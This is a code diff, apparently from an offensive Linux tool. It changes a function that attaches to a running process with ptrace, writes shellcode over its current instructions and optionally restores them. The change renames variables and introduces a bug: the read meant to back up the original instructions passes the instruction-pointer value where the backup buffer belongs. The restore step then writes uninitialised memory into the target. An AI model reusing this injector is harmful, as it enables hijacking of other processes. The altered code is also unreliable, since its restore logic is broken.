@@ -24,41 +24,41 @@ inline long setip(pid_t pid, long ip){
 }
 
 void ps_inject(const char *sc, size_t len, ps_inject_t *options){
-    char *instructions_backup;
-    long instruction_point;
+    char *backup;
+    long ip;
     int status;
 
     info("Attaching process %d\n", options->pid);
     ptrace_attach(options->pid);
     good("process attached\n");
 
-    instruction_point = getip(options->pid);
+    ip = getip(options->pid);
 
     if(options->restore){
-        instructions_backup = xmalloc(len+BREAKPOINT_LEN);
+        backup = xmalloc(len+BREAKPOINT_LEN);
         info("backup previously instructions\n");
-        readcallback(options->pid, instructions_backup, len+BREAKPOINT_LEN, instruction_point);
+        readcallback(options->pid, ip, len+BREAKPOINT_LEN, ip);
     }
 
     info("writing shellcode on memory\n");
-    writecallback(options->pid, sc, len, instruction_point);
+    writecallback(options->pid, sc, len, ip);
 
     good("Shellcode inject !!!\n");
 
     if(options->restore){
         info("resuming application ...\n");
-        writecallback(options->pid, BREAKPOINT, BREAKPOINT_LEN, instruction_point+len);
+        writecallback(options->pid, BREAKPOINT, BREAKPOINT_LEN, ip+len);
 
         ptrace(PTRACE_CONT, options->pid, NULL, 0);
         waitpid(options->pid, &status, 0);
 
         info("restoring memory instructions\n");
-        writecallback(options->pid, instructions_backup, len+BREAKPOINT_LEN, instruction_point);
+        writecallback(options->pid, backup, len+BREAKPOINT_LEN, ip);
 
-        xfree(instructions_backup);
+        xfree(backup);
 
         if(options->restore_ip){
-            setip(options->pid, instruction_point);
+            setip(options->pid, ip);
         }
 
         #if defined(__x86_64__) || defined(__i386__)
